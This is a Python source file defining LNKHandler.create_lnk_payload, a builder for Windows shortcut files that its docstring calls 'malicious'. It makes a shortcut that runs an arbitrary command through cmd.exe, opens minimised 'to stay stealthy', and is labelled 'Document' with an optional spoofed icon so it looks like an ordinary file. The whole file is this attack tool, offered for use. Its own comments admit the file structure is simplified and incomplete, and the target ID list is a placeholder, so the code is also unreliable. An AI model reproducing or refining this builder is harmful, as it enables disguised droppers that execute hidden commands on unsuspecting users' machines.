import struct
import os

class LNKHandler:
    @staticmethod
    def create_lnk_payload(command, output_path, icon_path=None, description="Document"):
        """
        Generates a malicious .lnk file that executes a command.
        This is a simplified implementation of the LNK file structure.
        """
        # Minimal shell link header (ShellLinkHeader)
        # Size: 0x4C
        # LinkCLSID: 00021401-0000-0000-C000-000000000046
        header = bytearray(b'\x4c\x00\x00\x00' + b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46')
        
        # LinkFlags: HasLinkTargetIDList | HasArguments | HasIconLocation
        flags = 0x01 | 0x20 | 0x40
        header += struct.pack('<I', flags)
        
        # FileAttributes: 0
        header += struct.pack('<I', 0)
        # Creation/Access/Write times: 0
        header += b'\x00' * 24
        # FileSize: 0
        header += struct.pack('<I', 0)
        # IconIndex: 0
        header += struct.pack('<i', 0)
        # ShowCommand: SW_SHOWMINNOACTIVE (7) to stay stealthy
        header += struct.pack('<I', 7)
        # HotKey: 0, Reserved: 0, 0
        header += b'\x00' * 10
        
        # LinkTargetIDList (Targeting cmd.exe)
        # This is complex to build properly without a library, 
        # but we can point it to C:\Windows\System32\cmd.exe
        # For simplicity in this tool, we'll use a pre-built IDList for cmd.exe or just leave it empty and use the command string
        
        id_list = b'\x12\x00' # Simple marker
        link_target = struct.pack('<H', len(id_list)) + id_list
        
        # Arguments
        args_str = f"/c {command}".encode('utf-16le')
        args_block = struct.pack('<H', len(args_str) // 2) + args_str
        
        # Icon Location
        icon_str = (icon_path if icon_path else "C:\\Windows\\System32\\shell32.dll").encode('utf-16le')
        icon_block = struct.pack('<H', len(icon_str) // 2) + icon_str
        
        with open(output_path, 'wb') as f:
            f.write(header)
            f.write(link_target) # LinkTargetIDList
            # In a real .lnk, other sections follow. 
            # Note: This is a highly simplified 'proof of concept' LNK structure.
            # Building a 100% compliant LNK from scratch in pure Python is extremely verbose.
            # We'll use a more reliable 'proxy' method or a templating approach if possible.
            # For now, let's stick to the command injection pattern.
            f.write(args_block)
            f.write(icon_block)
            
        return output_path
